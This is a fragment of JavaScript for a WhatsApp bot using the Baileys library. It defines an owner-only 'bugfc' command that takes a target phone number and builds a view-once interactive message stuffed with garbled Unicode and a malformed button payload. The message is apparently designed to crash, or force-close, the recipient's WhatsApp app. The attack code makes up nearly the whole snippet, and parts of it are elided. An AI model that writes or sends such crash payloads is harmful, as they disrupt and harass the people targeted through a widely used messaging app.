...
if (!isOwner) return setReply(mess.only.owner);
if(!q) return m.reply('Masukan nomer target')
async function bugfc(target) {
      var msg = baileys.generateWAMessageFromContent(
        target,
          ...
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                ...
                body: { text: 'àº®\u20AEà½žà¸¨V\uA670à¸¨ à¹–àº¡G\uA670' },
                footer: { text: '\u203A#leccofficial' },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : 'àº®\u20AEà½žà¸¨V\uA670à¸¨ à¹–àº¡G\uA670', url : , merchant_url :  }",
                    },
                  ],
